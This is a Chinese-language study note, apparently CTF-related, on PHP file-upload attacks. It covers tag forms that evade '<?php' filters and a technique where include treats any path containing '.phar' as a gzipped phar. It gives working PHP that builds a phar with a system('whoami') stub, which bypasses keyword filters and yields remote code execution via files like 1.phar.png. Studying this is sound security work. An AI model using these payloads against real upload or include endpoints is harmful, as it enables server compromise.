
[打开 PDF]（[PHP安全学习—文件上传.pdf](file:///E:/%E4%B8%8B%E8%BD%BD/PHP%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.pdf)）

## 绕过\<?php头
用
```
<script language=php>
</script>

<??>

<%%>
```

# phar和include进行文件包含
https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/
我们知道include函数过程中会识别.phar字符串

![[Pasted image 20251105221024.png]]

然后将其当成phar.gz进行自动解压
![[Pasted image 20251105221153.png]]
解压之后把解压的内容当成include的内容，所以这里我们可以使用

shell.phar.png当文件名，但是我们依旧可以把他当成一个压缩包进行解压，那么我们就有绕过思路了



比如下面是一个合法的 gzip 压缩 Phar：

```
php -d phar.readonly=0 -r '
    $phar = new Phar("test.phar");
    $phar["index.php"] = "<?php echo 123;";
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->compress(Phar::GZ);  // 关键！
'
```

生成的 `test.phar`：

- 外表是 gzip 格式；
- 里面是 tar + Phar 元数据；
- PHP 打开它的时候就需要：
    1. 判断是 gzip；
    2. 解压到临时流；
    3. 再继续扫描 `__HALT_COMPILER();` 或 tar header；

要是我们打包成了zip，那么 PHP 会识别成 zip，通过 `phar_parse_zipfile()` 去解析。

最后的结论就是，比如我们生成了一个phar文件，然后把他打包成gz文件，当我们include这个gz文件时，php会默认把这个gz文件解压回phar进行解析，比如我们用下面这个代码生成一个phar文件：

```php
<?php $phar = new Phar('exploit.phar');
 $phar->startBuffering(); 
 $stub = <<<'STUB'
<?php 
system('whoami'); 
__HALT_COMPILER();
?> 
STUB; 
$phar->setStub($stub);
$phar->addFromString('test.txt', 'test'); 
$phar->stopBuffering(); 
?>
```
可以看到现在还有明显的关键字：


![[Pasted image 20251105221654.png]]


现在打包一下，可以看到关键字已经完全消失了：
![[Pasted image 20251105221707.png]]


当我们include这个phar.gz文件时，php会自动解压这个gz文件，所以最后相当于是直接include这个phar文件，而这里有关键字：

```
<?php
    system('whoami');
    __HALT_COMPILER();
?>
```

所以就直接rce了：****

![[Pasted image 20251105221729.png]]
由于上面说过我们可以
所以事实上我们完全不需要保证最后include的是一个xxx.phar.gzip文件，只要文件名里有.phar即可，所以说无论我们是include 1.phar.png还是1.phar.html均可以正常rce：

![[Pasted image 20251105221928.png]]

甚至只要包含的路径里带了.phar这几个字就能解析 哪怕是目录也行：
![[Pasted image 20251105222025.png]]

但如果没有.phar这几个字就不能解析了：
![[Pasted image 20251105222045.png]]














